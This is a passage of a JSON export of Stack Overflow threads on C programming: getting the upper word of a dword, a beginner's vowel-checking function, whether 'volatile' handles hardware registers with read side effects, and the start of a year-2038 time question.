"https://www.gravatar.com/avatar/d8617539bff1793c4358775c3c877f0e?s=128&d=identicon&r=PG&f=1", "display_name": "LucasN", "link": "https://stackoverflow.com/users/8104188/lucasn"}, "is_accepted": false, "score": 0, "last_activity_date": 1498004714, "creation_date": 1498004714, "answer_id": 44664983, "question_id": 44664833, "link": "https://stackoverflow.com/questions/44664833/what-is-the-most-efficient-way-to-get-the-upper-word-of-a-dword-in-c/44664983#44664983", "title": "What is the most efficient way to get the upper word of a dword in C?", "body": "<p>Bit shifting is definitely the most efficient way to do this. Computers have specific hardware to do these exact types of operations, so they can be done very quickly. These hardware components are called Arithmetic Logic Units (ALU). You can find a little bit more about ALUs and bit shifting <a href=\"https://en.wikipedia.org/wiki/Arithmetic_logic_unit\" rel=\"nofollow noreferrer\">here</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 581, "user_id": 1801864, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8f94be3717c4134dfd9040131714e4e2?s=128&d=identicon&r=PG", "display_name": "JonS", "link": "https://stackoverflow.com/users/1801864/jons"}, "edited": false, "score": 0, "creation_date": 1498182353, "post_id": 44666223, "comment_id": 76406291, "body": "If optimizations are disabled, they could be very different."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 581, "user_id": 1801864, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8f94be3717c4134dfd9040131714e4e2?s=128&d=identicon&r=PG", "display_name": "JonS", "link": "https://stackoverflow.com/users/1801864/jons"}, "edited": false, "score": 0, "creation_date": 1498521286, "post_id": 44666223, "comment_id": 76521436, "body": "@JonS True they could be different for a number of reasons, yet if the compiler is optimizing for speed, a good compiler would emit the same performance code for both.  If optimizations are disabled the whole point of &quot;What is the most efficient way ...?&quot; appears moot."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1498014615, "creation_date": 1498014615, "answer_id": 44666223, "question_id": 44664833, "link": "https://stackoverflow.com/questions/44664833/what-is-the-most-efficient-way-to-get-the-upper-word-of-a-dword-in-c/44666223#44666223", "title": "What is the most efficient way to get the upper word of a dword in C?", "body": "<p>Casting breaks anti-aliasing rules, as well as being endian dependent, so is not a contender.</p>\n\n<p>With a good compiler, no reason to expect <code>uint16_t var2 = var1 &gt;&gt; 16;</code> and  <code>uint16_t var2 = var1 / 0x10000u;</code> to emit different performance code.  If they do, then \"Did I miss any other way to do it?\" --> get a better compiler.</p>\n"}], "owner": {"reputation": 581, "user_id": 1801864, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8f94be3717c4134dfd9040131714e4e2?s=128&d=identicon&r=PG", "display_name": "JonS", "link": "https://stackoverflow.com/users/1801864/jons"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 409, "favorite_count": 2, "accepted_answer_id": 44664897, "answer_count": 4, "score": 2, "last_activity_date": 1498181979, "creation_date": 1498003409, "last_edit_date": 1498181979, "question_id": 44664833, "link": "https://stackoverflow.com/questions/44664833/what-is-the-most-efficient-way-to-get-the-upper-word-of-a-dword-in-c", "title": "What is the most efficient way to get the upper word of a dword in C?", "body": "<p>Let's say I have a dword.</p>\n\n<pre><code>uint32_t var1 = 0xABCD1234;\n</code></pre>\n\n<p>I need to get the upper word as it's own value.  There are several different ways to do this in C.  Which one is most likely to compile most efficiently on a 32-bit processor/OS?  Does it make a difference if it's a 64-bit processor/OS?</p>\n\n<h2>1. Shifting</h2>\n\n<pre><code>uint16_t var2 = var1 &gt;&gt; 16;\n</code></pre>\n\n<h2>2. Casting</h2>\n\n<p>This requires knowing the endianess of the processor, so it's a negative in that regards, but assume you have the endianess correct.</p>\n\n<pre><code>uint16_t var2 = *( (uint16*)&amp;var1 );\n</code></pre>\n\n<p>or</p>\n\n<pre><code>uint16_t var2 = *( (uint16_t*)&amp;var1 + 1 );\n</code></pre>\n\n<h2>3. Dividing</h2>\n\n<pre><code>uint16_t var2 = (uint16_t)( var1 / ( 1ULL &lt;&lt; 16 ) );\n</code></pre>\n\n<h2>4. Anything else?</h2>\n\n<p>Did I miss any other way to do it?</p>\n\n<p>EDIT:\nYes, I missed the union.</p>\n\n<pre><code>union { uint32_t v32; uint16_t v16[2]; } u;\n\nuint32_t var1 = 0xABCD1234;\nu.v32 = var1;\nuint16_t var2 = u.v16[1]; // or u.v16[0] depending on endianess\n</code></pre>\n"}, {"tags": ["c", "arrays", "string", "char", "character"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1498003845, "post_id": 44664793, "comment_id": 76315182, "body": "<code>compare == &quot;A&quot;</code> --&gt; <code>compare == &#39;A&#39;</code> and <code>strcmp(compare,&quot;E&quot;==0)</code>  --&gt; <code>compare == &#39;E&#39;</code> Because type of <code>compare</code> is <code>char</code>, not <code>char *</code>."}, {"owner": {"reputation": 1213, "user_id": 8134032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b185eace7b99bb80d233c6d9d8fc308?s=128&d=identicon&r=PG&f=1", "display_name": "jacoblaw", "link": "https://stackoverflow.com/users/8134032/jacoblaw"}, "edited": false, "score": 1, "creation_date": 1498003902, "post_id": 44664793, "comment_id": 76315194, "body": "Why are you treating the char E different from the rest?"}, {"owner": {"reputation": 15, "user_id": 8191282, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kWZ9O.jpg?s=128&g=1", "display_name": "Son Goku", "link": "https://stackoverflow.com/users/8191282/son-goku"}, "edited": false, "score": 0, "creation_date": 1498176691, "post_id": 44664793, "comment_id": 76405108, "body": "Thank you for all your inputs, I have found out the answer which is what mr @ScottK have said as well. Thank you for the tips as well"}], "answers": [{"tags": [], "owner": {"reputation": 957, "user_id": 7677659, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64040baa08e1811ae7d9d48944da8eb2?s=128&d=identicon&r=PG&f=1", "display_name": "pritesh agrawal", "link": "https://stackoverflow.com/users/7677659/pritesh-agrawal"}, "is_accepted": false, "score": 0, "last_activity_date": 1498003956, "creation_date": 1498003956, "answer_id": 44664894, "question_id": 44664793, "link": "https://stackoverflow.com/questions/44664793/c-language-checking-vowels-in-a-string/44664894#44664894", "title": "(C language) Checking vowels in a String", "body": "<p>You can try with below , I did not run the code , but i hope it would work :</p>\n\n<pre><code>void checkVowel(char someString[]){\n\nint i, len;\nchar compare;\n\nlen = strlen(someString);\nprintf(\"%d\\n\", len);\n\nprintf(\"you name in all uppercase: \");\nprintf(strupr(someString));\n\n\n  for(i=0; i&lt;len;i++){\n\n    char vowelArray[5] = [ 'A','E','I','O','U'];\n    char  compare = someString[i];\n    int j;\n    for (j = 0 ; j &lt; 5; j++){\n\n      if(compare == vowelArray[j]){\n\n       printf(\"\\n%c\", compare);\n\n      }\n    }       \n\n  }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 15, "user_id": 8191282, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kWZ9O.jpg?s=128&g=1", "display_name": "Son Goku", "link": "https://stackoverflow.com/users/8191282/son-goku"}, "edited": false, "score": 0, "creation_date": 1523886495, "post_id": 44664902, "comment_id": 86732623, "body": "Im sorry I was not able to come back to this at all. haha Thank you for your input regarding this."}], "tags": [], "owner": {"reputation": 1385, "user_id": 6693299, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CIeRF.jpg?s=128&g=1", "display_name": "ScottK", "link": "https://stackoverflow.com/users/6693299/scottk"}, "is_accepted": true, "score": 0, "last_activity_date": 1498004015, "creation_date": 1498004015, "answer_id": 44664902, "question_id": 44664793, "link": "https://stackoverflow.com/questions/44664793/c-language-checking-vowels-in-a-string/44664902#44664902", "title": "(C language) Checking vowels in a String", "body": "<p>You are using strcmp to compare a character to a C string, that will fail. You should have seen a compiler warning when you tried to do this. Instead of comparing chars and single-character strings, simply compare chars one at a time. No need to use strcmp at all.</p>\n\n<p>Note that using <code>strupr</code> is a non-standard <a href=\"https://stackoverflow.com/a/26328095/6693299\">deprecated</a> function provided by Microsoft. Use <code>toupper</code> instead:</p>\n\n<pre><code>#include &lt;ctype.h&gt; // defines toupper and tolower\nvoid checkVowel(char someString[]){\n    int i, len;\n\n    len = strlen(someString);\n    printf(\"%d\\n\", len);\n\n    printf(\"you name in all uppercase: \");\n    printf(strupr(someString));\n\n    for(i=0; i&lt;len;i++) {\n       char compare = toupper(someString[i]));\n       if ((compare == 'A') || \n           (compare == 'E') || \n           (compare == 'I') || \n           (compare == 'O') ||\n           (compare == 'U')) {\n            printf(\"\\n%c\", compare);\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 15, "user_id": 8191282, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kWZ9O.jpg?s=128&g=1", "display_name": "Son Goku", "link": "https://stackoverflow.com/users/8191282/son-goku"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 987, "favorite_count": 0, "accepted_answer_id": 44664902, "answer_count": 2, "score": 0, "last_activity_date": 1498004015, "creation_date": 1498003182, "last_edit_date": 1498003262, "question_id": 44664793, "link": "https://stackoverflow.com/questions/44664793/c-language-checking-vowels-in-a-string", "title": "(C language) Checking vowels in a String", "body": "<p>I am making a vowel checker function. I am somewhat new to the language. I read through that I can not compare a string literal and a character array. Is this true? My program always crashes and I can't see what the problem is. Can anyone explain to me why my code has a problem. Thank you for any kind of input.</p>\n\n<pre><code>void checkVowel(char someString[]){\n\n    int i, len;\n    char compare;\n\n    len = strlen(someString);\n    printf(\"%d\\n\", len);\n\n    printf(\"you name in all uppercase: \");\n    printf(strupr(someString));\n\n\n    for(i=0; i&lt;len;i++){\n\n        char  compare = someString[i];\n\n\n\n        if(compare == \"A\" || (strcmp(compare,\"E\"==0))|| compare == \"I\" || compare == \"O\" || compare == \"U\"){\n            printf(\"\\n%c\", compare);\n        }\n\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "embedded", "language-lawyer"], "comments": [{"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1497999218, "post_id": 44664185, "comment_id": 76313986, "body": "So far as I can tell, the standard does not distinguish between read and write accesses when defining the behaviour of <code>volatile</code>."}, {"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1497999313, "post_id": 44664185, "comment_id": 76314014, "body": "<a href=\"https://stackoverflow.com/questions/13823669/how-to-force-an-unused-memory-read-in-c-that-wont-be-optimized-away\" title=\"how to force an unused memory read in c that wont be optimized away\">stackoverflow.com/questions/13823669/&hellip;</a> feels like a dupe."}, {"owner": {"reputation": 170705, "user_id": 44330, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/dd5a7ef1476fb01998a215b1642dfd07?s=128&d=identicon&r=PG", "display_name": "Jason S", "link": "https://stackoverflow.com/users/44330/jason-s"}, "reply_to_user": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1497999918, "post_id": 44664185, "comment_id": 76314187, "body": "I agree that it&#39;s closely related (and thanks for the reference; <a href=\"https://stackoverflow.com/a/13842698/44330\">Lundin&#39;s answer</a> seems to answer my question) but not exactly a duplicate."}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1498023978, "post_id": 44664185, "comment_id": 76320267, "body": "<code>volatile</code> solves the problem of a compiler optimising away access operations it &quot;considers unnecessary&quot; (because it doesn&#39;t know the register might be changed externally) - It does <b>not</b> solve <i>atomicity</i>, however. This must be done on top of using <code>volatile</code>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498044436, "post_id": 44664185, "comment_id": 76333466, "body": "Too broad. It depends on the platform. Not sure what you mean with &quot;<code>volatile</code> containing information&quot;. The standard defines the semantics of <code>volatile</code>, but there is no additional information stored with the qualifier."}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498013730, "post_id": 44664677, "comment_id": 76317399, "body": "Looks like &quot;What constitutes an access to an object that has volatile-qualified type is implementation-defined.&quot; is the key.  If OP&#39;s compiler details the implementation-defined behavior, all is copacetic."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": false, "score": 3, "last_activity_date": 1498002273, "creation_date": 1498002273, "answer_id": 44664677, "question_id": 44664185, "link": "https://stackoverflow.com/questions/44664185/is-volatile-enough-to-allow-the-compiler-to-handle-machine-registers-with-side/44664677#44664677", "title": "Is `volatile` enough to allow the compiler to handle machine registers with side-effects on read?", "body": "<p>I think your description of how the compiler has to look at it is correct.  The C standard's requirements are specified in ISO/IEC 9899:2011 \u00a76.7.3 <strong>Type qualifiers</strong>:</p>\n\n<blockquote>\n  <p>\u00b67 An object that has volatile-qualified type may be modified in ways unknown to the\n  implementation or have other unknown side effects. Therefore any expression referring\n  to such an object shall be evaluated strictly according to the rules of the abstract machine,\n  as described in 5.1.2.3. Furthermore, at every sequence point the value last stored in the\n  object shall agree with that prescribed by the abstract machine, except as modified by the\n  unknown factors mentioned previously.<sup>134)</sup> What constitutes an access to an object that\n  has volatile-qualified type is implementation-defined.</p>\n  \n  <p><hr>\n  <sup>134)</sup> A <code>volatile</code> declaration may be used to describe an object corresponding to a memory-mapped\n  input/output port or an object accessed by an asynchronously interrupting function. Actions on\n  objects so declared shall not be \u2018\u2018optimized out\u2019\u2019 by an implementation or reordered except as\n  permitted by the rules for evaluating expressions.</p>\n</blockquote>\n\n<p>The only cause for concern is the last sentence \u2014 that what qualifies as access is implementation-defined.  That means you should be able to find out for any given compiler what qualifies as access; the implementation is required to define and document the rules.  However, different compilers on different machines might have different interpretations of what 'an access' means.</p>\n\n<p>Section 5.1.2.3 <strong>Program execution</strong> is moderately long and moderately complex to parse:</p>\n\n<blockquote>\n  <p>\u00b61 The semantic descriptions in this International Standard describe the behavior of an\n  abstract machine in which issues of optimization are irrelevant.</p>\n  \n  <p>\u00b62 Accessing a volatile object, modifying an object, modifying a file, or calling a function that does any of those operations are all <em>side effects</em>,<sup>12)</sup> which are changes in the state of the execution environment. <em>Evaluation</em> of an expression in general includes both value computations and initiation of side effects. Value computation for an lvalue expression includes determining the identity of the designated object.</p>\n  \n  <p>\u00b64 In the abstract machine, all expressions are evaluated as specified by the semantics. An actual implementation need not evaluate part of an expression if it can deduce that its value is not used and that no needed side effects are produced (including any caused by calling a function or accessing a volatile object).</p>\n  \n  <p>\u00b66 The least requirements on a conforming implementation are:</p>\n  \n  <ul>\n  <li>Accesses to volatile objects are evaluated strictly according to the rules of the abstract machine.</li>\n  </ul>\n</blockquote>\n\n<p>Footnote 12 refers to floating point state.  \u00b63 defines 'sequenced before' etc.  \u00b65 discusses signal handling.  There are more 'least requirements' but they don't mention volatile.</p>\n\n<p>I think this all agrees with your interpretation of how the code you show should be handled in the light of the <code>volatile</code> qualifier.</p>\n"}, {"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498044570, "post_id": 44670334, "comment_id": 76333558, "body": "The CPU is often a minor problem. Modern &quot;bus&quot; interfaces like PCIe also buffer, reorder, etc. The commonly used DMA on modern systems adds additional complications."}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498045904, "post_id": 44670334, "comment_id": 76334529, "body": "@Olaf CPUs are rarely a problem, true. But when they are things go spectacularly bad. AMD had a fun one. Some memory mapped registers can be safely accessed cached. One system created register mappings that were both cached and uncached. The code had a branch that picked which mapping a write should go to. Speculative execution executed both branches which fetched and dirtied a cache line while the actual write went directly to the device. Next cache eviction wrote out the unmodified cache line to the device."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498046119, "post_id": 44670334, "comment_id": 76334694, "body": "That sounds more like a missconfiguration of the MMU and related, i.e. an OS problem. Point is: this was no issue on bare-metal embedded systems until few years ago. But it becomes more and more relevant with larger ARM systems like Cortex-M7 (the M3/4 are still relatively simple by default)."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1498046781, "post_id": 44670334, "comment_id": 76335191, "body": "There is no reason to go beyond the C standard at all, no idea where you got that idea from. The only issue is if register access in C translates &quot;bit set&quot; versus &quot;read-modify-write&quot;, which is a separate issue not related to <code>volatile</code>. Overall, there&#39;s not necessarily some complex desktop OS which will hide everything behind 42 levels of abstraction. None of your concerns are particularly relevant on for example a bare metal embedded system. Where register access almost always can be written in 100% standard compliant C."}, {"owner": {"reputation": 170705, "user_id": 44330, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/dd5a7ef1476fb01998a215b1642dfd07?s=128&d=identicon&r=PG", "display_name": "Jason S", "link": "https://stackoverflow.com/users/44330/jason-s"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1498071681, "post_id": 44670334, "comment_id": 76352583, "body": "@Lundin I agree for most embedded systems but the processor has to have <a href=\"https://homes.cs.washington.edu/~bornholt/post/memory-models.html\" rel=\"nofollow noreferrer\">sequentially-consistent behavior</a> so if it can reorder instructions using relaxed memory model then yeah, I have to worry."}], "tags": [], "owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "is_accepted": false, "score": 1, "last_activity_date": 1498032569, "creation_date": 1498032569, "answer_id": 44670334, "question_id": 44664185, "link": "https://stackoverflow.com/questions/44664185/is-volatile-enough-to-allow-the-compiler-to-handle-machine-registers-with-side/44670334#44670334", "title": "Is `volatile` enough to allow the compiler to handle machine registers with side-effects on read?", "body": "<p>When dealing with memory mapped registers you pretty much have to go beyond what the C standard guarantees. If you're lucky you only need to rely on implementation specific behavior, but often you need to go beyond that and pretty much verify by hand that the generated code is correct. Even if you find a way to make this strictly standards conforming you have to account for that this is a very rarely exercised and tested area of the compiler and is one of those things that can easily be broken by an edge case in some obscure minor bugfix release. This is why almost all operating system kernels have a limited list of compilers they are supposed to be compiled with.</p>\n\n<p>The kernels I have experience from follow pretty much the same pattern. Memory mapped registers are abstracted away behind some handles with function pointers for various accesses to registers. This is primarily so that you can use the same API to talk to different buses on different architecture, but the secondary purpose of it is that functions hidden behind function pointers are good at convincing the compiler to not inline and reorder things (there is rarely an actual guarantee of that, but see paragraph 1). The functions themselves range from trivial pointer dereference on certain architectures to raw assembly on architectures where the compilers have proven to be hard to convince to not be creative or where specific memory barriers are necessary.</p>\n\n<p>Speaking of that last bit, you need to take the memory model into consideration. Just because the compiler isn't creative with reordering your code doesn't mean that the CPU isn't free to do whatever it wants. And this is definitely outside of the C standard.</p>\n"}, {"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 4, "last_activity_date": 1498046155, "creation_date": 1498046155, "answer_id": 44675404, "question_id": 44664185, "link": "https://stackoverflow.com/questions/44664185/is-volatile-enough-to-allow-the-compiler-to-handle-machine-registers-with-side/44675404#44675404", "title": "Is `volatile` enough to allow the compiler to handle machine registers with side-effects on read?", "body": "<blockquote>\n  <p>Is there enough information in volatile to get the compiler to understand that there might be side effects from a read?</p>\n</blockquote>\n\n<p>Yes.</p>\n\n<p>The C language formal definition of a <em>side effect</em> actually targets this very scenario. C11 5.1.2.3:</p>\n\n<blockquote>\n  <p>Accessing a <code>volatile</code> object, modifying an object, modifying a file, or calling a function\n  that does any of those operations are all <em>side effects</em>, which are changes in the state of\n  the execution environment.</p>\n</blockquote>\n\n<p>Regarding what the compile is allowed to optimize, C11 5.2.3.4:</p>\n\n<blockquote>\n  <p>In the abstract machine, all expressions are evaluated as specified by the semantics. An\n  actual implementation need not evaluate part of an expression if it can deduce that its\n  value is not used and that no needed side effects are produced (including any caused by calling a function or accessing a <code>volatile</code> object).</p>\n</blockquote>\n\n<p>In plain English, this means that any form of access, read or write, to a volatile object, is considered a side effect and a compiler is not allowed to optimize away side effects.</p>\n\n<blockquote>\n  <p>...then my intuition is that these three functions have different behavior</p>\n</blockquote>\n\n<p>Indeed they have. This is why coding standards such as MISRA-C forbids us to mix <code>volatile</code> variable access together with other things in the same expression. In the UART scenario, doing so might cause loss of status flags which would be a severe bug.</p>\n\n<p>Robust programs read/write to volatile variables on a single line and do all other necessary arithmetic in separate expressions.</p>\n"}], "owner": {"reputation": 170705, "user_id": 44330, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/dd5a7ef1476fb01998a215b1642dfd07?s=128&d=identicon&r=PG", "display_name": "Jason S", "link": "https://stackoverflow.com/users/44330/jason-s"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 166, "favorite_count": 0, "accepted_answer_id": 44675404, "answer_count": 3, "score": 4, "last_activity_date": 1498046155, "creation_date": 1497998934, "question_id": 44664185, "link": "https://stackoverflow.com/questions/44664185/is-volatile-enough-to-allow-the-compiler-to-handle-machine-registers-with-side", "title": "Is `volatile` enough to allow the compiler to handle machine registers with side-effects on read?", "body": "<p>I work with microcontrollers where there are occasionally machine registers that have actions that occur when a register is read. Yes, that's not a typo, there's lots of registers that cause actions when they are <em>written</em>, but in a few cases if you read a register, something happens.</p>\n\n<p>The most common instance of this is a UART receive register hooked up to one end of a FIFO; for example let's say there is <code>RXDATA</code>. When you read <code>RXDATA</code> it pulls one byte out of the FIFO and the next time you read <code>RXDATA</code> it will get the next byte.</p>\n\n<p><strong>Is there enough information in <code>volatile</code> to get the compiler to understand that there might be side effects from a read?</strong></p>\n\n<p>Example fragment in C:</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdbool.h&gt;\n\nvolatile uint8_t RXDATA;   \n// there is some mechanism for associating this with a known hardware address\n// (either in linker information, or in some compiler-specific attribute not shown)    \n\n// Check that bit 0 is 1 and bit 7 is 0.\nbool check_bits_1() \n{\n   const uint8_t rxdata = RXDATA;\n   return (rxdata &amp; 1) &amp;&amp; ((rxdata &amp; 0x80) == 0);\n}\n\n// Check that bit 0 is 1 and bit 7 is 0.\nbool check_bits_2() \n{\n   return (RXDATA &amp; 1) &amp;&amp; ((RXDATA &amp; 0x80) == 0);\n}\n\n// Check that bit 0 is 1 and bit 7 is 0.\nbool check_bits_3() \n{\n   const bool bit_0_is_1 = RXDATA &amp; 1;\n   const bool bit_7_is_0 = (RXDATA &amp; 0x80) == 0;\n   return bit_0_is_1 &amp;&amp; bit_7_is_0;\n}\n</code></pre>\n\n<p>If I ignore the C standard and pretend that a compiler does exactly what I think I am asking it to do (<a href=\"https://en.wikipedia.org/wiki/DWIM\" rel=\"nofollow noreferrer\">DWIM</a>), then my intuition is that these three functions have different behavior:</p>\n\n<ul>\n<li>In the first case, we read <code>RXDATA</code> once, so we pull out one byte of the FIFO and then do some math on it.</li>\n<li>In the second case, we read <code>RXDATA</code> either once or twice (because <code>&amp;&amp;</code> has short-circuit behavior), doing math directly on the register value, so we might either pull out one or two bytes from the FIFO, and this has incorrect behavior.</li>\n<li>In the third case, we read <code>RXDATA</code> twice, pulling two bytes from the FIFO, so this is incorrect behavior.</li>\n</ul>\n\n<p>Whereas if <code>RXDATA</code> isn't <code>volatile</code> then presumably all three of the above implementations are equivalent.</p>\n\n<p>Does the C standard require the compiler to interpret <code>volatile</code> in this case in the same way I am looking at it? If not, how can a hardware register be handled properly in C?</p>\n"}, {"tags": ["c++", "c", "visual-studio-2015", "visual-studio-2017", "year2038"], "comments": [{"owner": {"reputation": 1273, "user_id": 2287427, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b12dacf80e8ab397c3fdcd4f0d49c32d?s=128&d=identicon&r=PG", "display_name": "Dave S", "link": "https://stackoverflow.com/users/2287427/dave-s"}, "edited": false, "score": 0, "creation_date": 1497999757, "post_id": 44664164, "comment_id": 76314136, "body": "You might want to edit this into a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> so we can try it without needing to add the missing bits or set our system clock to 2040 and mess up cookies, certs, licenses and such."}, {"owner": {"reputation": 269328, "user_id": 5987, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/2a1f9f4986b58015691eb2014e78869f?s=128&d=identicon&r=PG", "display_name": "Mark Ransom", "link": "https://stackoverflow.com/users/5987/mark-ransom"}, "edited": false, "score": 0, "creation_date": 1497999786, "post_id": 44664164, "comment_id": 76314146, "body": "According to <a href=\"https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/ftime-ftime32-ftime64\" rel=\"nofollow noreferrer\">the documentation</a> <code>_timeb64</code> should be good through 12/31/3000. How are you arriving at the conclusion that it doesn&#39;t work?"}, {"owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69630c63a1394dc9ecdd4407ceace587?s=128&d=identicon&r=PG&f=1", "display_name": "syplex", "link": "https://stackoverflow.com/users/1368613/syplex"}, "reply_to_user": {"reputation": 1273, "user_id": 2287427, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b12dacf80e8ab397c3fdcd4f0d49c32d?s=128&d=identicon&r=PG", "display_name": "Dave S", "link": "https://stackoverflow.com/users/2287427/dave-s"}, "edited": false, "score": 0, "creation_date": 1498002991, "post_id": 44664164, "comment_id": 76315009, "body": "@DaveS - I updated it with some additional steps. You will have to adjust your clock to test this."}, {"owner": {"reputation": 177852, "user_id": 576911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2a2941970f141aad669d13375dc57c4f?s=128&d=identicon&r=PG", "display_name": "Howard Hinnant", "link": "https://stackoverflow.com/users/576911/howard-hinnant"}, "edited": false, "score": 0, "creation_date": 1498007562, "post_id": 44664164, "comment_id": 76315963, "body": "<code>2526338561</code> looks a little suspicious as this corresponds to 2050-01-21 00:42:41 UTC."}, {"owner": {"reputation": 1069, "user_id": 1368613, "user_type": "registered", "profile_image": 